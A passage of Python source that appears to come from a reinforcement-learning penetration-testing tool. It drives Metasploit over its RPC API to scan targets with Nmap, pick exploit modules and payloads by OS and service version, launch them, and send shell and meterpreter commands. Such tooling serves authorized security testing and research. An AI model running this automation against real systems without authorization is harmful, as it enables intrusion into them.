import sys
import os
import time
import re
import copy
import json
import csv
import codecs
import random
import ipaddress
import configparser
import msgpack
import http.client
import threading
import numpy as np
import pandas as pd
import tensorflow as tf
from bs4 import BeautifulSoup
from docopt import docopt
from keras.models import *
from keras.layers import *
from keras import backend as K
from util import Utilty
from modules.VersionChecker import VersionChecker
from modules.VersionCheckerML import VersionCheckerML
from modules.ContentExplorer import ContentExplorer
from CreateReport import CreateReport

os.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'

ST_OS_TYPE = 0 
ST_SERV_NAME = 1
ST_SERV_VER = 2
ST_MODULE = 3
ST_TARGET = 4 
NUM_STATES = 5
NONE_STATE = None
NUM_ACTIONS = 0

R_GREAT = 100
R_GOOD = 1
R_BAD = -1

S_NORMAL = -1
S_EXPLOIT = 0
S_PEXPLOIT = 1

OK = 'ok' 
NOTE = 'note'
FAIL = 'fail'
WARNING = 'warn'
NONE = 'none' 


class Msgrpc:
    def __init__(self, option=[]):
        self.host = option.get('host') or "127.0.0.1"
        self.port = option.get('port') or 55552
        self.uri = option.get('uri') or "/api/"
        self.ssl = option.get('ssl') or False
        self.authenticated = False
        self.token = False
        self.headers = {"Content-type": "binary/message-pack"}
        if self.ssl:
            self.client = http.client.HTTPSConnection(self.host, self.port)
        else:
            self.client = http.client.HTTPConnection(self.host, self.port)
        self.util = Utilty()
        
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.con_retry = int(config['Common']['con_retry'])
        self.retry_count = 0
        self.console_id = 0

    def call(self, meth, origin_option):
        option = copy.deepcopy(origin_option)
        option = self.set_api_option(meth, option)

        resp = self.send_request(meth, option, origin_option)
        return msgpack.unpackb(resp.read())

    def set_api_option(self, meth, option):
        if meth != 'auth.login':
            if not self.authenticated:
                self.util.print_message(FAIL, 'MsfRPC: Not Authenticated.')
                exit(1)
        if meth != 'auth.login':
            option.insert(0, self.token)
        option.insert(0, meth)
        return option

    def send_request(self, meth, option, origin_option):
        params = msgpack.packb(option)
        resp = ''
        try:
            self.client.request("POST", self.uri, params, self.headers)
            resp = self.client.getresponse()
            self.retry_count = 0
        except Exception as err:
            while True:
                self.retry_count += 1
                if self.retry_count == self.con_retry:
                    self.util.print_exception(err, 'Retry count is over.')
                    exit(1)
                else:
                    self.util.print_message(WARNING, '{}/{} Retry "{}" call. reason: {}'.format(
                        self.retry_count, self.con_retry, option[0], err))
                    time.sleep(1.0)
                    if self.ssl:
                        self.client = http.client.HTTPSConnection(self.host, self.port)
                    else:
                        self.client = http.client.HTTPConnection(self.host, self.port)
                    if meth != 'auth.login':
                        self.login(self.msgrpc_user, self.msgrpc_pass)
                        option = self.set_api_option(meth, origin_option)
                        self.get_console()
                    resp = self.send_request(meth, option, origin_option)
                    break
        return resp

    def login(self, user, password):
        ret = self.call('auth.login', [user, password])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = True
                self.token = ret.get(b'token')
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.login')
            exit(1)

    
    def keep_alive(self):
        self.util.print_message(OK, 'Executing keep_alive..')
        _ = self.send_command(self.console_id, 'version\n', False)

    
    def get_console(self):
        
        ret = self.call('console.create', [])
        try:
            self.console_id = ret.get(b'id')
            _ = self.call('console.read', [self.console_id])
        except Exception as err:
            self.util.print_exception(err, 'Failed: console.create')
            exit(1)

    
    def send_command(self, console_id, command, visualization, sleep=0.1):
        _ = self.call('console.write', [console_id, command])
        time.sleep(0.5)
        ret = self.call('console.read', [console_id])
        time.sleep(sleep)
        result = ''
        try:
            result = ret.get(b'data').decode('utf-8')
            if visualization:
                self.util.print_message(OK, 'Result of "{}":\n{}'.format(command, result))
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(command))
        return result

    
    def get_module_list(self, module_type):
        ret = {}
        if module_type == 'exploit':
            ret = self.call('module.exploits', [])
        elif module_type == 'auxiliary':
            ret = self.call('module.auxiliary', [])
        elif module_type == 'post':
            ret = self.call('module.post', [])
        elif module_type == 'payload':
            ret = self.call('module.payloads', [])
        elif module_type == 'encoder':
            ret = self.call('module.encoders', [])
        elif module_type == 'nop':
            ret = self.call('module.nops', [])

        try:
            byte_list = ret[b'modules']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: Getting {} module list.'.format(module_type))
            exit(1)

    
    def get_module_info(self, module_type, module_name):
        return self.call('module.info', [module_type, module_name])

    
    def get_compatible_payload_list(self, module_name):
        ret = self.call('module.compatible_payloads', [module_name])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: module.compatible_payloads.')
            return []

    
    def get_target_compatible_payload_list(self, module_name, target_num):
        ret = self.call('module.target_compatible_payloads', [module_name, target_num])
        try:
            byte_list = ret[b'payloads']
            string_list = []
            for module in byte_list:
                string_list.append(module.decode('utf-8'))
            return string_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: module.target_compatible_payloads.')
            return []

    
    def get_module_options(self, module_type, module_name):
        return self.call('module.options', [module_type, module_name])

    
    def execute_module(self, module_type, module_name, options):
        ret = self.call('module.execute', [module_type, module_name, options])
        try:
            job_id = ret[b'job_id']
            uuid = ret[b'uuid'].decode('utf-8')
            return job_id, uuid
        except Exception as e:
            if ret[b'error_code'] == 401:
                self.login(self.msgrpc_user, self.msgrpc_pass)
            else:
                self.util.print_exception(e, 'Failed: module.execute.')
                exit(1)

    
    def get_job_list(self):
        jobs = self.call('job.list', [])
        try:
            byte_list = jobs.keys()
            job_list = []
            for job_id in byte_list:
                job_list.append(int(job_id.decode('utf-8')))
            return job_list
        except Exception as e:
            self.util.print_exception(e, 'Failed: job.list.')
            return []

    
    def get_job_info(self, job_id):
        return self.call('job.info', [job_id])

    
    def stop_job(self, job_id):
        return self.call('job.stop', [job_id])

    
    def get_session_list(self):
        return self.call('session.list', [])

    
    def stop_session(self, session_id):
        _ = self.call('session.stop', [str(session_id)])

    
    def stop_meterpreter_session(self, session_id):
        _ = self.call('session.meterpreter_session_detach', [str(session_id)])

    
    def execute_shell(self, session_id, cmd):
        ret = self.call('session.shell_write', [str(session_id), cmd])
        try:
            return ret[b'write_count'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    
    def get_shell_result(self, session_id, read_pointer):
        ret = self.call('session.shell_read', [str(session_id), read_pointer])
        try:
            seq = ret[b'seq'].decode('utf-8')
            data = ret[b'data'].decode('utf-8')
            return seq, data
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.shell_read.')
            return 0, 'Failed'

    
    def execute_meterpreter(self, session_id, cmd):
        ret = self.call('session.meterpreter_write', [str(session_id), cmd])
        try:
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    
    def execute_meterpreter_run_single(self, session_id, cmd):
        ret = self.call('session.meterpreter_run_single', [str(session_id), cmd])
        try:
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: {}'.format(cmd))
            return 'Failed'

    
    def get_meterpreter_result(self, session_id):
        ret = self.call('session.meterpreter_read', [str(session_id)])
        try:
            return ret[b'data'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.meterpreter_read')
            return None

    
    def upgrade_shell_session(self, session_id, lhost, lport):
        ret = self.call('session.shell_upgrade', [str(session_id), lhost, lport])
        try:
            return ret[b'result'].decode('utf-8')
        except Exception as e:
            self.util.print_exception(e, 'Failed: session.shell_upgrade')
            return 'Failed'

    
    def logout(self):
        ret = self.call('auth.logout', [self.token])
        try:
            if ret.get(b'result') == b'success':
                self.authenticated = False
                self.token = ''
                return True
            else:
                self.util.print_message(FAIL, 'MsfRPC: Authentication failed.')
                exit(1)
        except Exception as e:
            self.util.print_exception(e, 'Failed: auth.logout')
            exit(1)

    
    def termination(self, console_id):
        
        _ = self.call('console.session_kill', [console_id])
        _ = self.logout()


class Metasploit:
    def __init__(self, target_ip='127.0.0.1'):
        self.util = Utilty()
        self.rhost = target_ip
        
        full_path = os.path.dirname(os.path.abspath(__file__))
        config = configparser.ConfigParser()
        try:
            config.read(os.path.join(full_path, 'config.ini'))
        except FileExistsError as err:
            self.util.print_message(FAIL, 'File exists error: {}'.format(err))
            sys.exit(1)
        
        server_host = config['Common']['server_host']
        server_port = int(config['Common']['server_port'])
        self.msgrpc_user = config['Common']['msgrpc_user']
        self.msgrpc_pass = config['Common']['msgrpc_pass']
        self.timeout = int(config['Common']['timeout'])
        self.max_attempt = int(config['Common']['max_attempt'])
        self.save_path = os.path.join(full_path, config['Common']['save_path'])
        self.save_file = os.path.join(self.save_path, config['Common']['save_file'])
        self.data_path = os.path.join(full_path, config['Common']['data_path'])
        if os.path.exists(self.data_path) is False:
            os.mkdir(self.data_path)
        self.plot_file = os.path.join(self.data_path, config['Common']['plot_file'])
        self.port_div_symbol = config['Common']['port_div']

        
        self.lhost = server_host
        self.lport = int(config['Metasploit']['lport'])
        self.proxy_host = config['Metasploit']['proxy_host']
        self.proxy_port = int(config['Metasploit']['proxy_port'])
        self.prohibited_list = str(config['Metasploit']['prohibited_list']).split('@')
        self.path_collection = str(config['Metasploit']['path_collection']).split('@')

        
        self.nmap_command = config['Nmap']['command']
        self.nmap_timeout = config['Nmap']['timeout']
        self.nmap_2nd_command = config['Nmap']['second_command']
        self.nmap_2nd_timeout = config['Nmap']['second_timeout']

        
        self.train_worker_num = int(config['A3C']['train_worker_num'])
        self.train_max_num = int(config['A3C']['train_max_num'])
        self.train_max_steps = int(config['A3C']['train_max_steps'])
        self.train_tmax = int(config['A3C']['train_tmax'])
        self.test_worker_num = int(config['A3C']['test_worker_num'])
        self.greedy_rate = float(config['A3C']['greedy_rate'])
        self.eps_steps = int(self.train_max_num * self.greedy_rate)

        
        self.state = []                                            
        self.os_type = str(config['State']['os_type']).split('@')  
        self.os_real = len(self.os_type) - 1
        self.service_list = str(config['State']['services']).split('@')  

        
        self.report_test_path = os.path.join(full_path, config['Report']['report_test'])
        self.report_train_path = os.path.join(self.report_test_path, config['Report']['report_train'])
        if os.path.exists(self.report_train_path) is False:
            os.mkdir(self.report_train_path)
        self.scan_start_time = self.util.get_current_date()
        self.source_host= server_host

        self.client = Msgrpc({'host': server_host, 'port': server_port})  
        self.client.login(self.msgrpc_user, self.msgrpc_pass)  
        self.client.get_console()                              
        self.buffer_seq = 0
        self.isPostExploit = False                             

    
    def get_exploit_tree(self):
        self.util.print_message(NOTE, 'Get exploit tree.')
        exploit_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'exploit_tree.json')) is False:
            for idx, exploit in enumerate(com_exploit_list):
                temp_target_tree = {'targets': []}
                temp_tree = {}
                
                use_cmd = 'use exploit/' + exploit + '\n'
                _ = self.client.send_command(self.client.console_id, use_cmd, False)

                
                show_cmd = 'show targets\n'
                target_info = ''
                time_count = 0
                while True:
                    target_info = self.client.send_command(self.client.console_id, show_cmd, False)
                    if 'Exploit targets' in target_info:
                        break
                    if time_count == 5:
                        self.util.print_message(OK, 'Timeout: {0}'.format(show_cmd))
                        self.util.print_message(OK, 'No exist Targets.')
                        break
                    time.sleep(1.0)
                    time_count += 1
                target_list = self.cutting_strings(r'\s*([0-9]{1,3}) .*[a-z|A-Z|0-9].*[\r\n]', target_info)
                for target in target_list:
                    
                    payload_list = self.client.get_target_compatible_payload_list(exploit, int(target))
                    temp_tree[target] = payload_list

                
                options = self.client.get_module_options('exploit', exploit)
                key_list = options.keys()
                option = {}
                for key in key_list:
                    sub_option = {}
                    sub_key_list = options[key].keys()
                    for sub_key in sub_key_list:
                        if isinstance(options[key][sub_key], list):
                            end_option = []
                            for end_key in options[key][sub_key]:
                                end_option.append(end_key.decode('utf-8'))
                            sub_option[sub_key.decode('utf-8')] = end_option
                        else:
                            end_option = {}
                            if isinstance(options[key][sub_key], bytes):
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key].decode('utf-8')
                            else:
                                sub_option[sub_key.decode('utf-8')] = options[key][sub_key]

                    
                    sub_option['user_specify'] = ""
                    option[key.decode('utf-8')] = sub_option

                
                temp_target_tree['target_list'] = target_list
                temp_target_tree['targets'] = temp_tree
                temp_target_tree['options'] = option
                exploit_tree[exploit] = temp_target_tree
                
                self.util.print_message(OK, '{}/{} exploit:{}, targets:{}'.format(str(idx + 1),
                                                                                  len(com_exploit_list),
                                                                                  exploit,
                                                                                  len(target_list)))

            
            fout = codecs.open(os.path.join(self.data_path, 'exploit_tree.json'), 'w', 'utf-8')
            json.dump(exploit_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved exploit tree.')
        else:
            
            local_file = os.path.join(self.data_path, 'exploit_tree.json')
            self.util.print_message(OK, 'Loaded exploit tree from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            exploit_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
        return exploit_tree

    
    def get_target_info(self, rhost, proto_list, port_info):
        self.util.print_message(NOTE, 'Get target info.')
        target_tree = {}
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            
            path_list = ['' for idx in range(len(com_port_list))]
            
            if self.isPostExploit is False:
                
                version_checker = VersionChecker(self.util)
                version_checker_ml = VersionCheckerML(self.util)
                content_explorer = ContentExplorer(self.util)

                
                web_port_list = self.util.check_web_port(rhost, com_port_list, self.client)

                
                web_target_info = self.util.run_spider(rhost, web_port_list, self.client)

                
                uniq_product = []
                for idx_target, target in enumerate(web_target_info):
                    web_prod_list = []
                    
                    target_list = target[2]
                    if self.util.is_scramble is True:
                        self.util.print_message(WARNING, 'Scramble target list.')
                        target_list = random.sample(target[2], len(target[2]))

                    
                    if self.util.max_target_url != 0 and self.util.max_target_url < len(target_list):
                        self.util.print_message(WARNING, 'Cutting target list {} to {}.'
                                                .format(len(target[2]), self.util.max_target_url))
                        target_list = target_list[:self.util.max_target_url]

                    
                    for count, target_url in enumerate(target_list):
                        self.util.print_message(NOTE, '{}/{} Start analyzing: {}'
                                                .format(count + 1, len(target_list), target_url))
                        self.client.keep_alive()

                        
                        parsed = util.parse_url(target_url)
                        if parsed is None:
                            continue

                        
                        _, res_header, res_body = self.util.send_request('GET', target_url)

                        
                        if self.util.max_target_byte != 0 and (self.util.max_target_byte < len(res_body)):
                            self.util.print_message(WARNING, 'Cutting response byte {} to {}.'
                                                    .format(len(res_body), self.util.max_target_byte))
                            res_body = res_body[:self.util.max_target_byte]

                        
                        web_prod_list.extend(version_checker.get_product_name(parsed,
                                                                              res_header + res_body,
                                                                              self.client))

                        
                        web_prod_list.extend(version_checker_ml.get_product_name(parsed,
                                                                                 res_header + res_body,
                                                                                 self.client))

                    
                    parsed = None
                    try:
                        parsed = util.parse_url(target[0])
                    except Exception as e:
                        self.util.print_exception(e, 'Parsed error : {}'.format(target[0]))
                        continue
                    web_prod_list.extend(content_explorer.content_explorer(parsed, target[0], self.client))

                    
                    tmp_list = []
                    for item in list(set(web_prod_list)):
                        tmp_item = item.split('@')
                        tmp = tmp_item[0] + ' ' + tmp_item[1] + ' ' + tmp_item[2]
                        if tmp not in tmp_list:
                            tmp_list.append(tmp)
                            uniq_product.append(item)

                
                for idx, web_prod in enumerate(uniq_product):
                    web_item = web_prod.split('@')
                    proto_list.append('tcp')
                    port_info.append(web_item[0] + ' ' + web_item[1])
                    com_port_list.append(web_item[2] + self.port_div_symbol + str(idx))
                    path_list.append(web_item[3])

            
            target_tree = {'rhost': rhost, 'os_type': self.os_real}
            for port_idx, port_num in enumerate(com_port_list):
                temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'target_path': '', 'exploit': []}

                
                service_name = 'unknown'
                for (idx, service) in enumerate(self.service_list):
                    if service in port_info[port_idx].lower():
                        service_name = service
                        break
                temp_tree['prod_name'] = service_name

                
                
                regex_list = [r'.*\s(\d{1,3}\.\d{1,3}\.\d{1,3}).*',
                              r'.*\s[a-z]?(\d{1,3}\.\d{1,3}[a-z]\d{1,3}).*',
                              r'.*\s[\w]?(\d{1,3}\.\d{1,3}\.\d[a-z]{1,3}).*',
                              r'.*\s[a-z]?(\d\.\d).*',
                              r'.*\s(\d\.[xX|\*]).*']
                version = 0.0
                output_version = 0.0
                for (idx, regex) in enumerate(regex_list):
                    version_raw = self.cutting_strings(regex, port_info[port_idx])
                    if len(version_raw) == 0:
                        continue
                    if idx == 0:
                        index = version_raw[0].rfind('.')
                        version = version_raw[0][:index] + version_raw[0][index + 1:]
                        output_version = version_raw[0]
                        break
                    elif idx == 1:
                        index = re.search(r'[a-z]', version_raw[0]).start()
                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                        output_version = version_raw[0]
                        break
                    elif idx == 2:
                        index = re.search(r'[a-z]', version_raw[0]).start()
                        version = version_raw[0][:index] + str(ord(version_raw[0][index])) + version_raw[0][index + 1:]
                        index = version.rfind('.')
                        version = version_raw[0][:index] + version_raw[0][index:]
                        output_version = version_raw[0]
                        break
                    elif idx == 3:
                        version = self.cutting_strings(r'[a-z]?(\d\.\d)', version_raw[0])
                        version = version[0]
                        output_version = version_raw[0]
                        break
                    elif idx == 4:
                        version = version_raw[0].replace('X', '0').replace('x', '0').replace('*', '0')
                        version = version[0]
                        output_version = version_raw[0]
                temp_tree['version'] = float(version)

                
                temp_tree['protocol'] = proto_list[port_idx]

                if path_list is not None:
                    temp_tree['target_path'] = path_list[port_idx]

                
                module_list = []
                raw_module_info = ''
                idx = 0
                search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
                raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
                module_list = self.extract_osmatch_module(self.cutting_strings(r'(exploit/.*)', raw_module_info))
                if service_name != 'unknown' and len(module_list) == 0:
                    self.util.print_message(WARNING, 'Can\'t load exploit module: {}'.format(service_name))
                    temp_tree['prod_name'] = 'unknown'

                for module in module_list:
                    if module[1] in {'excellent', 'great', 'good'}:
                        temp_tree['exploit'].append(module[0])
                target_tree[str(port_num)] = temp_tree

                
                self.util.print_message(OK, 'Analyzing port {}/{}, {}/{}, '
                                            'Available exploit modules:{}'.format(port_num,
                                                                                  temp_tree['protocol'],
                                                                                  temp_tree['prod_name'],
                                                                                  output_version,
                                                                                  len(temp_tree['exploit'])))

            
            fout = codecs.open(os.path.join(self.data_path, 'target_info_' + rhost + '.json'), 'w', 'utf-8')
            json.dump(target_tree, fout, indent=4)
            fout.close()
            self.util.print_message(OK, 'Saved target tree.')
        else:
            
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()

        return target_tree

    
    def get_target_info_indicate(self, rhost, proto_list, port_info, port=None, prod_name=None):
        self.util.print_message(NOTE, 'Get target info for indicate port number.')
        target_tree = {'origin_port': port}

        
        com_port_list = []
        for prod in prod_name.split('@'):
            temp_tree = {'prod_name': '', 'version': 0.0, 'protocol': '', 'exploit': []}
            virtual_port = str(np.random.randint(999999999))
            com_port_list.append(virtual_port)

            
            service_name = 'unknown'
            for (idx, service) in enumerate(self.service_list):
                if service == prod.lower():
                    service_name = service
                    break
            temp_tree['prod_name'] = service_name

            
            temp_tree['version'] = float(0.0)

            
            temp_tree['protocol'] = 'tcp'

            
            module_list = []
            raw_module_info = ''
            idx = 0
            search_cmd = 'search name:' + service_name + ' type:exploit app:server\n'
            raw_module_info = self.client.send_command(self.client.console_id, search_cmd, False, 3.0)
            module_list = self.cutting_strings(r'(exploit/.*)', raw_module_info)
            if service_name != 'unknown' and len(module_list) == 0:
                continue
            for exploit in module_list:
                raw_exploit_info = exploit.split(' ')
                exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
                if exploit_info[2] in {'excellent', 'great', 'good'}:
                    temp_tree['exploit'].append(exploit_info[0])
            target_tree[virtual_port] = temp_tree

            
            self.util.print_message(OK, 'Analyzing port {}/{}, {}, '
                                        'Available exploit modules:{}'.format(port,
                                                                              temp_tree['protocol'],
                                                                              temp_tree['prod_name'],
                                                                              len(temp_tree['exploit'])))

        
        with codecs.open(os.path.join(self.data_path, 'target_info_indicate_' + rhost + '.json'), 'w', 'utf-8') as fout:
            json.dump(target_tree, fout, indent=4)

        return target_tree, com_port_list

    
    def extract_osmatch_module(self, module_list):
        osmatch_module_list = []
        for module in module_list:
            raw_exploit_info = module.split(' ')
            exploit_info = list(filter(lambda s: s != '', raw_exploit_info))
            os_type = exploit_info[0].split('/')[1]
            if self.os_real == 0 and os_type in ['windows', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 1 and os_type in ['unix', 'freebsd', 'bsdi', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 2 and os_type in ['solaris', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 3 and os_type in ['osx', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 4 and os_type in ['netware', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 5 and os_type in ['linux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 6 and os_type in ['irix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 7 and os_type in ['hpux', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 8 and os_type in ['freebsd', 'unix', 'bsdi', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 9 and os_type in ['firefox', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 10 and os_type in ['dialup', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 11 and os_type in ['bsdi', 'unix', 'freebsd', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 12 and os_type in ['apple_ios', 'unix', 'osx', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 13 and os_type in ['android', 'linux', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 14 and os_type in ['aix', 'unix', 'multi']:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
            elif self.os_real == 15:
                osmatch_module_list.append([exploit_info[0], exploit_info[2]])
        return osmatch_module_list

    
    def cutting_strings(self, pattern, target):
        return re.findall(pattern, target)

    
    def normalization(self, target_idx):
        if target_idx == ST_OS_TYPE:
            os_num = int(self.state[ST_OS_TYPE])
            os_num_mean = len(self.os_type) / 2
            self.state[ST_OS_TYPE] = (os_num - os_num_mean) / os_num_mean
        if target_idx == ST_SERV_NAME:
            service_num = self.state[ST_SERV_NAME]
            service_num_mean = len(self.service_list) / 2
            self.state[ST_SERV_NAME] = (service_num - service_num_mean) / service_num_mean
        elif target_idx == ST_MODULE:
            prompt_num = self.state[ST_MODULE]
            prompt_num_mean = len(com_exploit_list) / 2
            self.state[ST_MODULE] = (prompt_num - prompt_num_mean) / prompt_num_mean

    
    def execute_nmap(self, rhost, command, timeout):
        self.util.print_message(NOTE, 'Execute Nmap against {}'.format(rhost))
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            
            self.util.print_message(OK, '{}'.format(command))
            self.util.print_message(OK, 'Start time: {}'.format(self.util.get_current_date()))
            _ = self.client.call('console.write', [self.client.console_id, command])

            time.sleep(3.0)
            time_count = 0
            while True:
                
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if (time_count % 5) == 0:
                        self.util.print_message(OK, 'Port scanning: {} [Elapsed time: {} s]'.format(rhost, time_count))
                        self.client.keep_alive()
                    if timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout   : {}'.format(command))
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        break

                    status = ret.get(b'busy')
                    if status is False:
                        self.util.print_message(OK, 'End time  : {}'.format(self.util.get_current_date()))
                        time.sleep(5.0)
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: {}'.format(command))
                time.sleep(1.0)
                time_count += 1

            _ = self.client.call('console.destroy', [self.client.console_id])
            ret = self.client.call('console.create', [])
            try:
                self.client.console_id = ret.get(b'id')
            except Exception as e:
                self.util.print_exception(e, 'Failed: console.create')
                exit(1)
            _ = self.client.call('console.read', [self.client.console_id])
        else:
            self.util.print_message(OK, 'Nmap already scanned.')

    
    def get_port_list(self, nmap_result_file, rhost):
        self.util.print_message(NOTE, 'Get port list from {}.'.format(nmap_result_file))
        global com_port_list
        port_list = []
        proto_list = []
        info_list = []
        if os.path.exists(os.path.join(self.data_path, 'target_info_' + rhost + '.json')) is False:
            nmap_result = ''
            cat_cmd = 'cat ' + nmap_result_file + '\n'
            _ = self.client.call('console.write', [self.client.console_id, cat_cmd])
            time.sleep(3.0)
            time_count = 0
            while True:
                
                ret = self.client.call('console.read', [self.client.console_id])
                try:
                    if self.timeout == time_count:
                        self.client.termination(self.client.console_id)
                        self.util.print_message(OK, 'Timeout: "{}"'.format(cat_cmd))
                        break

                    nmap_result += ret.get(b'data').decode('utf-8')
                    status = ret.get(b'busy')
                    if status is False:
                        break
                except Exception as e:
                    self.util.print_exception(e, 'Failed: console.read')
                time.sleep(1.0)
                time_count += 1

            
            port_list = []
            proto_list = []
            info_list = []
            bs = BeautifulSoup(nmap_result, 'lxml')
            ports = bs.find_all('port')
            for idx, port in enumerate(ports):
                port_list.append(str(port.attrs['portid']))
                proto_list.append(port.attrs['protocol'])

                for obj_child in port.contents:
                    if obj_child.name == 'service':
                        temp_info = ''
                        if 'product' in obj_child.attrs:
                            temp_info += obj_child.attrs['product'] + ' '
                        if 'version' in obj_child.attrs:
                            temp_info += obj_child.attrs['version'] + ' '
                        if 'extrainfo' in obj_child.attrs:
                            temp_info += obj_child.attrs['extrainfo']
                        if temp_info != '':
                            info_list.append(temp_info)
                        else:
                            info_list.append('unknown')
                
                self.util.print_message(OK, 'Getting {}/{} info: {}'.format(str(port.attrs['portid']),
                                                                            port.attrs['protocol'],
                                                                            info_list[idx]))

            if len(port_list) == 0:
                self.util.print_message(WARNING, 'No open port.')
                self.util.print_message(WARNING, 'Shutdown Javelin...')
                self.client.termination(self.client.console_id)
                exit(1)

            
            com_port_list = port_list

            
            some_os = bs.find_all('osmatch')
            os_name = 'unknown'
            for obj_os in some_os:
                for obj_child in obj_os.contents:
                    if obj_child.name == 'osclass' and 'osfamily' in obj_child.attrs:
                        os_name = (obj_child.attrs['osfamily']).lower()
                        break

            
            for (idx, os_type) in enumerate(self.os_type):
                if os_name in os_type:
                    self.os_real = idx
        else:
            
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            key_list = list(target_tree.keys())
            for key in key_list[2:]:
                port_list.append(str(key))

            
            com_port_list = port_list

        return port_list, proto_list, info_list

    
    def get_exploit_list(self):
        self.util.print_message(NOTE, 'Get exploit list.')
        all_exploit_list = []
        if os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is False:
            self.util.print_message(OK, 'Loading exploit list from Metasploit.')

            
            all_exploit_list = []
            exploit_candidate_list = self.client.get_module_list('exploit')
            for idx, exploit in enumerate(exploit_candidate_list):
                module_info = self.client.get_module_info('exploit', exploit)
                time.sleep(0.1)
                try:
                    rank = module_info[b'rank'].decode('utf-8')
                    if rank in {'excellent', 'great', 'good'}:
                        all_exploit_list.append(exploit)
                        self.util.print_message(OK, '{}/{} Loaded exploit: {}'.format(str(idx + 1),
                                                                                      len(exploit_candidate_list),
                                                                                      exploit))
                    else:
                        self.util.print_message(WARNING, '{}/{} {} module is danger (rank: {}). Can\'t load.'
                                                .format(str(idx + 1), len(exploit_candidate_list), exploit, rank))
                except Exception as e:
                    self.util.print_exception(e, 'Failed: module.info')
                    exit(1)

            
            self.util.print_message(OK, 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
            fout = codecs.open(os.path.join(self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
            for item in all_exploit_list:
                fout.write(item + '\n')
            fout.close()
            self.util.print_message(OK, 'Saved exploit list.')
        else:
            
            local_file = os.path.join(self.data_path, 'exploit_list.csv')
            self.util.print_message(OK, 'Loaded exploit list from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                all_exploit_list.append(item.rstrip('\n'))
            fin.close()
        return all_exploit_list

    
    def get_payload_list(self, module_name='', target_num=''):
        self.util.print_message(NOTE, 'Get payload list.')
        all_payload_list = []
        if os.path.exists(os.path.join(self.data_path, 'payload_list.csv')) is False or module_name != '':
            self.util.print_message(OK, 'Loading payload list from Metasploit.')

            
            payload_list = []
